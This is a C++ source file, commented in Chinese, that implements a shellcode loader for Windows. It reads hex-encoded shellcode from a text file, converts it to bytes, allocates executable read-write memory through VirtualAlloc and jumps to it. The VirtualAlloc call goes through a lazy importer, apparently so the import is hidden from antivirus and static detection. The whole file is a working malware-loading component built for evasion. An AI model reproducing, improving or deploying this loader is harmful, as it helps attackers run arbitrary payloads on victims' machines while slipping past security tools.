#include <windows.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include "lazy_importer.hpp"
using namespace std;

// 将十六进制中的单个字符转换为相应的整数值
unsigned char hexCharToByte(char character) {
    if (character >= '0' && character <= '9') {
        return character - '0';
    }
    if (character >= 'a' && character <= 'f') {
        return character - 'a' + 10;
    }
    if (character >= 'A' && character <= 'F') {
        return character - 'A' + 10;
    }
    return 0;
}

// 将十六进制字符串转换成字节型数组
void hexStringToBytes(const std::string& hexString, unsigned char* byteArray, int byteArraySize) {
    for (int i = 0; i < hexString.length(); i += 2) {
        byteArray[i / 2] = hexCharToByte(hexString[i]) * 16 + hexCharToByte(hexString[i + 1]);
    }
}


int main()
{   

    std::ifstream file("shellcode_hex.txt");  //打开指定文件
    
    size_t size;  //定义文件内容的字节数
    string contents; //定义文件内容
    
    //判断文件是否打开成功
    if (file.is_open()) {
        std::stringstream buffer; //创建一个stringstream对象
        buffer << file.rdbuf();  //将文件的内容复制到该流中
        contents = buffer.str();  //将stringstream对象的内容转换string,并将其存储在contents中

        size = contents.length()/2;  //由于两个十六进制相当于一个字节,因此文件内容长度需除以2
        file.close();  //关闭文件
    }
    
    //printf("%d\n", size); 
    //cout << contents;


    // 为存储转换后的shellcode分配内存
    unsigned char* buffer = (unsigned char*)malloc(size);
    
    // 调用函数将十六进制字符串转换为字节型数组
    hexStringToBytes(contents, buffer, size);

    // 在内存中分配一块可以执行的区域
    char* exec = (char*)LI_FN(VirtualAlloc)(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 将shellcode复制到该区域
    memcpy(exec, buffer, size);
    
    // 执行该shellcode
    ((void(*) ())exec)();
}